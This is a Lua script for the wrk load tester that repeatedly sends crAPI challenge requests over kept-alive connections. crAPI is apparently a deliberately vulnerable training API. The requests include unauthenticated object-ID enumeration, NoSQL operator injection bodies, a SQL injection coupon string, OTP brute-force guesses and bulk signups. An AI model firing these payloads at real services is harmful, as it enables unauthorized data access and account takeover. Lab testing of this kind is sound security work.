-- wrk Lua: crAPI challenge patterns over persistent connections
-- Covers BOLA, data exposure, NoSQL injection, unauthenticated access

local counter = 0

local requests_list = {
  -- BOLA: mechanic reports (no auth needed)
  { method = "GET", path = "/workshop/api/mechanic/mechanic_report?report_id=1" },
  { method = "GET", path = "/workshop/api/mechanic/mechanic_report?report_id=2" },
  { method = "GET", path = "/workshop/api/mechanic/mechanic_report?report_id=3" },
  { method = "GET", path = "/workshop/api/mechanic/mechanic_report?report_id=5" },
  { method = "GET", path = "/workshop/api/mechanic/mechanic_report?report_id=10" },
  { method = "GET", path = "/workshop/api/mechanic/mechanic_report?report_id=20" },
  -- BOLA: unauthenticated order access
  { method = "GET", path = "/workshop/api/shop/orders/1" },
  { method = "GET", path = "/workshop/api/shop/orders/2" },
  { method = "GET", path = "/workshop/api/shop/orders/3" },
  { method = "GET", path = "/workshop/api/shop/orders/5" },
  { method = "GET", path = "/workshop/api/shop/orders/10" },
  -- Data exposure
  { method = "GET", path = "/workshop/api/mechanic" },
  { method = "GET", path = "/workshop/api/shop/products" },
  { method = "GET", path = "/community/api/v2/community/posts" },
  -- NoSQL injection
  { method = "POST", path = "/community/api/v2/coupon/validate-coupon", body = '{"coupon_code":{"$ne":1}}' },
  { method = "POST", path = "/community/api/v2/coupon/validate-coupon", body = '{"coupon_code":{"$gt":""}}' },
  { method = "POST", path = "/community/api/v2/coupon/validate-coupon", body = '{"coupon_code":{"$regex":".*"}}' },
  -- SQL injection
  { method = "POST", path = "/workshop/api/shop/apply_coupon", body = '{"coupon_code":"TRAC075\' OR \'1\'=\'1"}' },
  -- OTP brute-force (v2 no rate limit)
  { method = "POST", path = "/identity/api/auth/v2/check-otp", body = '{"email":"test@example.com","otp":"0000"}' },
  { method = "POST", path = "/identity/api/auth/v2/check-otp", body = '{"email":"test@example.com","otp":"1234"}' },
  { method = "POST", path = "/identity/api/auth/v2/check-otp", body = '{"email":"test@example.com","otp":"5678"}' },
  { method = "POST", path = "/identity/api/auth/v2/check-otp", body = '{"email":"test@example.com","otp":"9999"}' },
  -- Identity endpoints
  { method = "GET", path = "/" },
  { method = "GET", path = "/identity/api/auth/signup" },
  -- Registration attempts
  { method = "POST", path = "/identity/api/auth/signup", body = '{"name":"wrk-user","email":"wrk' .. os.time() .. '@test.com","number":"5551234567","password":"Torture123"}' },
}

request = function()
  counter = counter + 1
  local req = requests_list[(counter % #requests_list) + 1]

  wrk.headers["Connection"] = "keep-alive"
  wrk.headers["Content-Type"] = "application/json"

  if req.body then
    return wrk.format(req.method, req.path, nil, req.body)
  else
    return wrk.format(req.method, req.path)
  end
end
